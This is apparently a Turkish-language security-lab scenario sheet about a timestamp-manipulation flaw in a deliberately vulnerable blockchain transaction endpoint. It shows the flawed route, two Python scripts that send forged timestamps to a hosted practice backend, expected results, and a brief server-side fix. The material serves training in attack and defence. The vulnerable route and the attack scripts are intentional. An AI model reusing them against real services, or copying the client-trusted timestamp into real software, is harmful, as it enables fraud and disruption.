# 🔗 Blockchain Saldırısı - Zamanı Bük! | BEYZA'NIN SALDIRISI

**Senaryo ID:** `beyza-blockchain-delay`  
**Sorumlu:** Beyza  
**Kategori:** Blockchain  
**Zayıflık:** Timestamp Manipulation (Zaman Manipülasyonu)  
**Şiddet:** 🟡 ORTA

---

## 🎯 HEDEF: Blok Zincirini Kandır!

İşlemlerin zamanını değiştirerek blok onay sürelerini uzat veya işlemleri geçersiz kıl!

**Ne Yapabilirsin:**
- ⏳ Blok onaylarını geciktir (Hizmet aksatma)
- 💸 Double Spending (Aynı parayı iki kere harca)
- 🚫 İşlemleri reddettir

---

## 🔓 AÇIK NERDE?

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 241

```python
# ❌ TIMESTAMP KONTROLÜ YOK!
@router.post("/blockchain-transaction")
def submit_blockchain_tx(transaction: dict, timestamp: int):
    # Timestamp'i KULLANICI gönderiyor ve sunucu buna güveniyor!
    current_time = int(time.time())
    diff = current_time - timestamp  # Fark hesaplanıyor ama engellenmiyor
    
    return {"status": "accepted", "tx_time": timestamp}
```

---

## ⚔️ SALDIRI 1: Geçmişe Yolculuk (Gecikme Yaratma)

### Kod: `time_travel.py`

```python
import requests
import time

BACKEND = "https://evcs-backend-samet.onrender.com"

print("⏳ ZAMAN MANİPÜLASYONU SALDIRISI\n")

# Şimdiki zaman
now = int(time.time())
print(f"Şu an: {now}")

# SALDIRI: 1 saat öncesine işlem gönder!
fake_time = now - 3600  # -1 Saat

payload = {
    "transaction": {"from": "0xHacker", "to": "0xVictim", "amount": 100},
    "timestamp": fake_time  # SAHTE ZAMAN
}

print(f"Gönderilen Zaman: {fake_time} (1 saat önce)")

r = requests.post(f"{BACKEND}/vulnerable/blockchain-transaction", json=payload)
result = r.json()

print(f"\nSonuç: {result}")

if "vulnerability" in result:
    print("\n✅✅✅ BAŞARILI! Blok zamanı manipüle edildi! ✅✅✅")
    print(f"Fark: {result['time_difference_seconds']} saniye")
```

---

## ⚔️ SALDIRI 2: Konsensüs Saldırısı (Orphan Blocks)

```python
# consensus_attack.py
import requests
import time
import random

BACKEND = "https://evcs-backend-samet.onrender.com"

print("⛓️ KONSENSÜS SALDIRISI\n")

# Rastgele geçmiş ve gelecek zamanlar gönder
for i in range(5):
    # -2 saat ile +2 saat arası rastgele
    offset = random.randint(-7200, 7200)
    fake_time = int(time.time()) + offset
    
    payload = {
        "transaction": {"id": i, "data": "attack"},
        "timestamp": fake_time
    }
    
    r = requests.post(f"{BACKEND}/vulnerable/blockchain-transaction", json=payload)
    print(f"İstek {i+1}: Offset {offset}s -> {r.json()['status']}")

print("\n✅ Ağ stabilitesi bozuldu! Bloklar reddedilecek!")
```

---

## ✅ SIZDIN MI? KONTROL!

### 1. JSON Response

**BAŞARILI:**
```json
{
  "time_difference_seconds": 3600,
  "vulnerability": "Client-controlled timestamp!",
  "warning": "Can manipulate block confirmation times"
}
```

### 2. Web Arayüzü

https://simulasyon.vercel.app/ → `beyza-blockchain-delay`

**Metrics:**
- `block_confirmation_time_s` grafiği fırladı mı? ✅ EVET
- Logs'ta "Consensus delay detected" mesajı var mı? ✅ EVET

---

## 🛡️ SAVUNMA

```python
# Timestamp sunucuda belirlenmeli!
server_time = int(time.time())
if abs(server_time - client_time) > 120:  # 2 dakika tolerans
    raise Exception("Invalid timestamp!")
```

---

**Hazırlayan:** Beyza  
**Durum:** ✅ TIME IS BROKEN!
